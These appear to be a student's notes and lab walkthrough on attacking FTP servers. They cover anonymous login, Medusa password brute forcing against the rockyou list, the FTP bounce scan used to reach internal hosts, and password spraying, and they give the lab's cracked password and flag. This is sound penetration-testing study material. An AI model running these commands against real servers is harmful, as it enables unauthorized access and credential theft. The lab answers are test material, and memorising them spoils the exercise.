FTP (File Transfer Protocol) transfers files between computers and supports directory/file operations (change directory, list, rename, delete). Runs on TCP/21 by default.

Ways to attack an FTP server:

    Abuse misconfigurations or excessive privileges
    Exploit known vulnerabilities
    Discover new vulnerabilities

Once inside, always inspect directory contents for sensitive/critical info (see "Finding Sensitive Information" note). FTP exposes a hierarchical folder structure — commonly used by companies for software/website development workflows.
Enumeration

Nmap:

    -sC (default scripts) includes ftp-anon, which checks if anonymous login is allowed
    -sV (version detection) reveals the FTP banner, often including the version

sudo nmap -sC -sV -p 21 192.168.2.142

Example output shows ftp-anon: Anonymous FTP login allowed (FTP code 230) plus a directory listing with permissions — note the incoming folder flagged [NSE: writeable], meaning you could upload there too.

You can also interact with FTP directly using the ftp client or nc.
Misconfigurations

Anonymous authentication: log in with username anonymous and any/no password. Dangerous when read/write permissions aren't set correctly — sensitive files may be exposed, or you may be able to upload malicious scripts.

Chaining example: combine an FTP path-traversal bug with knowledge of a web app's file structure to locate an uploaded file and get it executed as PHP code.

Anonymous login example:

ftp 192.168.2.142
Name: anonymous
Password: (blank or anything)
230 Login successful.
ftp> ls

Useful FTP client commands:
Command 	Purpose
ls / cd 	Navigate directories
get 	Download a single file
mget 	Download multiple files
put 	Upload a single file
mput 	Upload multiple files
help 	List available commands

(Detailed misconfiguration hunting is covered in the Footprinting module — this module focuses on specific attacks.)
Protocol-specific attacks

Note: we attack the services using the protocol, not the protocol itself — many different services implement FTP differently.
Brute forcing

If anonymous auth isn't available, brute-force login with username/password lists.

Medusa flags:
Flag 	Meaning
-u 	single username
-U 	file of usernames
-P 	file of passwords
-M 	module/protocol (e.g. ftp)
-h 	target host/IP

medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp

Result: ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]

Caveat: most modern applications throttle/block brute forcing. Password spraying (few passwords, many users) is often more effective and stealthier.
FTP Bounce Attack

Uses an FTP server's PORT command to make it act as a proxy — relaying commands/traffic to a different device on the network, potentially one not otherwise reachable.

Scenario:

    FTP_DMZ — internet-exposed FTP server
    Internal_DMZ — internal device, not exposed
    You connect to FTP_DMZ and use it to scan Internal_DMZ, discovering its open ports, then use that in further attacks.

Nmap bounce scan (-b flag):

nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

This logs into the FTP proxy (10.10.110.213) and bounces a scan against 172.17.0.2 port 80.

Defense note: modern FTP servers block this by default, but misconfiguration can reopen the hole.
Pentester's quick checklist

    nmap -sC -sV -p21 <target> — check for anonymous login + grab banner/version
    Try anonymous login manually if flagged
    Browse directories for sensitive files; check for writeable folders
    If no anonymous access, consider brute force (Medusa) or password spraying
    Check whether the server might allow an FTP bounce to reach internal hosts
    Cross-reference any found credentials/usernames against other services (email, DB, etc.)

One-line summary

    FTP attacks mostly come down to three doors: anonymous access, weak/brute-forceable credentials, and misconfigured features like PORT command handling (bounce attacks) — always inspect what's inside once you're in.

Question1
What port is the FTP service running on?
> sudo nmap -sC -sV  10.129.203.6
2121

Question2
What username is available for the FTP server?
>ftp 10.129.203.6 -p 2121
Name (10.129.203.6:checkmate): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
ftp> ls
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list
ftp> get users.list
> cat users.list
robin

Question3
Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.
ftp> get passwords.list
> medusa -u robin -P passwords.list -h 10.129.203.6 -n 2121 -M ftp
2026-09-30 16:15:38 ACCOUNT FOUND: [ftp] Host: 10.129.203.6 User: robin Password: 7iz4rnckjsduza7 [SUCCESS]
> ftp 10.129.203.6 -p 2121
Name (10.129.203.6:checkmate): robin
Password: 
ftp> ls
ftp> get flag.txt
> cat flag.txt 
HTB{ATT4CK1NG_F7P_53RV1C3}
